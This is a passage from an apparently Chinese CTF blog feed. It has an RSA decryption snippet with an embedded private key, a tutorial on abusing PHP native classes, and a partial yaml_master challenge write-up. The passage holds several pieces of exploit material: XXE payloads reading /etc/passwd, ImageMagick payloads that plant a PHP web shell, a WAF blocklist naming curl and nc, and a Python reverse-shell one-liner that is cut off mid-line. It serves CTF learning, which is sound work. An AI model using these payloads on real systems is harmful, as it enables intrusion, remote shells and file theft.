class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_message</span>(<span class="hljs-params">encrypted_message_b64, private_key</span>):<br>    <span class="hljs-comment"># Base64解码加密消息</span><br>    encrypted_message = base64.b64decode(encrypted_message_b64)<br>    <span class="hljs-comment"># 导入私钥</span><br>    key = RSA.import_key(private_key)<br>    <span class="hljs-comment"># 创建解密器</span><br>    cipher = PKCS1_OAEP.new(key)<br>    <span class="hljs-comment"># 解密并返回结果</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_message).decode()<br><br><span class="hljs-comment"># 第二个私钥（实际能解密的私钥）</span><br>private_key = <span class="hljs-string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQCvNhcDwDMhZl3dJt0+gkvu/cQuRFM58aqCDRLfS5bnCMPFXFi8</span><br><span class="hljs-string">aHrYZNC7Tz/DrenOSUCv+d+4sZqjRW8GsbOR8DWK7wNO3SliQ8MmiY2jfF5omPaU</span><br><span class="hljs-string">5OJiGUuAYLbYeIUkvEn6Zf10hmwuaGwku5qgEEPppfaUtleFsOFjdYMbnQIDAQAB</span><br><span class="hljs-string">AoGACZwbXgrMIyBUtJz9lICb/pMvj+QSdoKhOfnSl6mzMJ/D8Q60FT1bw4OgCS37</span><br><span class="hljs-string">DtX6lWRiJmS7lwsyspLL2J+lfBuq2PrES/SRcp4TausDemtRfQVbKmBEcfy0oIn3</span><br><span class="hljs-string">DM7dT4EAhUSI2Z4Y6nX+3yztwQV0ReeYdlg2P8eOprftvVcCQQC3kpHbwv9kHa5N</span><br><span class="hljs-string">z49QFV5W1XHCD4KE3wC1xm/9dWbOMrGkR2v7CIXYoRcD6hg4kv5JzKPOaYYpygqZ</span><br><span class="hljs-string">qRR/uWfPAkEA9FcBpiiB1b7Ozxk7Gz6NF94MQItJ0xTrArArllBheAhIjaDAjX1z</span><br><span class="hljs-string">OQ++RGZVByXVLmPyWJNK93uR0tqQOju00wJACjRIjVnCjpMjzEl8Yuw9KUCGKU5p</span><br><span class="hljs-string">Z+9pf7E/KmyrQU0KGOKrevHXVtpliB8sJ4DsR7frZx7wiUQk4LPIYu0wewJBAIQo</span><br><span class="hljs-string">64NsNY3ffw0VoJrD4p0eRZJDxNKfZd42W90Z7R53nIa+hGgDiuc6VLe6ghMzq3NE</span><br><span class="hljs-string">LDksskfaVq2t+oUE9nECQQCptxk0oH5dwDttlWa0esz9V+HdMY4tQlvUuHUwCY9D</span><br><span class="hljs-string">slrK1kk630BceGayC2TYOvfdco7iui5HYIJ4W5ff3RRB</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 第二个加密消息（实际能解密的消息）</span><br>encrypted_msg = <span class="hljs-string">&quot;UpyynVxi3qhqCLRI+lsKnLZ4QrXmUCnmh8fRUR4yHbl49I2CnlwBmKtbOKKcXQCKBMrZ2sedeh7UiVBth5peL0IarRC/GHevnZOF2Bw48E5g5DAzzMsotqnDV0NZpKMuqyXtSeqm9I/gMUKzbPzBtwmmGQ66vCjswrdXghcmUc4=&quot;</span><br><br><span class="hljs-comment"># 解密并输出</span><br>decrypted = decrypt_message(encrypted_msg, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP原生类</title>
    <link href="/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍php常用的原生类</p><p>在php中只要函数名和参数可控，那么使用php原生类会有很大作用</p><blockquote><p>前提：<code>php.ini</code> 中通过 <code>disable_classes</code> 限制</p></blockquote><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>与DirectoryIterator相比具有更好的性能，用法其实是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> 是 PHP 的内置类，继承自 <code>FilesystemIterator</code>，专为 <strong>基于通配符模式（glob）的文件遍历</strong> 设计。它简化了按模式匹配文件的过程，无需手动过滤文件名，适用于快速枚举文件系统或查找特定文件。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接输入通配符使用<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>或者配合路径使用 查找路径下匹配的文件<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> 是 PHP 的内置类，继承自 <code>SplFileInfo</code>，专为 <strong>高效读写文件</strong> 设计。它在 CTF 中常用于 <strong>文件内容读取</strong>、<strong>源码泄露</strong> 和 <strong>特殊协议利用</strong>，尤其是在反序列化或文件操作漏洞场景中</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>配合伪协议读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> 是 PHP 的内置类，用于解析和操作 XML 数据。在 CTF 中，它常被用于 <strong>XXE（XML External Entity）攻击</strong>，通过构造恶意 XML 实体实现 <strong>文件读取</strong>、<strong>SSRF（服务端请求伪造）</strong> 或 <strong>远程代码执行</strong>。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从文件加载</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>可以解析XML实体文件那么可不可以自己写个XML文件实现rce或者任意文件读取呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//配合伪协议读取文件</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// 需要关闭实体加载器限制（PHP &lt; 8.0）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// 输出 /etc/passwd 内容</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//进行ssrf，进行外带等操作</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> 是 PHP 的图像处理扩展，支持多种图像格式的操作。在 CTF 中，它常被用于 <strong>恶意图像利用</strong> 和 <strong>文件读取&#x2F;命令执行</strong></p><blockquote><p>CVE-2016-3714:允许通过恶意图像执行命令，利用本函数</p></blockquote><p>先上传恶意图片</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>在触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// 读取恶意图像</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// 触发命令</span><br></code></pre></td></tr></table></figure><p>MSL 脚本利用</p><p>上传恶意msl文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>触发 MSL 脚本</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// 加载 MSL 脚本</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// 生成 output.php</span><br></code></pre></td></tr></table></figure><p>访问 <code>output.php?cmd=id</code> 即可执行命令</p><p>通过 <code>caption:</code> 协议读取本地文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// 生成包含 Flag 的 PHP 文件</span><br></code></pre></td></tr></table></figure><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="Error和Exception"><a href="#Error和Exception" class="headerlink" title="Error和Exception"></a>Error和Exception</h2><p>对于没有回显的rce可以利用这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// 触发命令执行但是没有回显</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 构造 Error 对象，利用其 __toString 方法</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// 输出命令执行结果</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.24</title>
    <link href="/tuyi/2025/01/24/2025-1-24/"/>
    <url>/tuyi/2025/01/24/2025-1-24/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser" class="headerlink" title="DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser"></a>DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br><br><br></code></pre></td></tr></table></figure><p>看源码是YAML反序列化。。。不太会后面应该会写一篇博客学习一下 参考<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</a></p><p>ban了好多常规的函数尝试绕过吧，编码绕过</p><p>可以发现是直接使用的<code>yaml.load</code>应该是&lt;5.1版本的，高版本要使用构造器</p><p>可以发现exec函数是没有过滤的</p><p>尝试使用exec构建解码器执行命令</p><p>命令：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;python3 -c \&#x27;</span>import os,pty,socket;s=socket.<span class="hljs-built_in">socket</span>();s.<span class="hljs-built_in">connect</span>((<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">32800</span>));[os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(),f)for f <span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;sh&quot;</span>)\<span 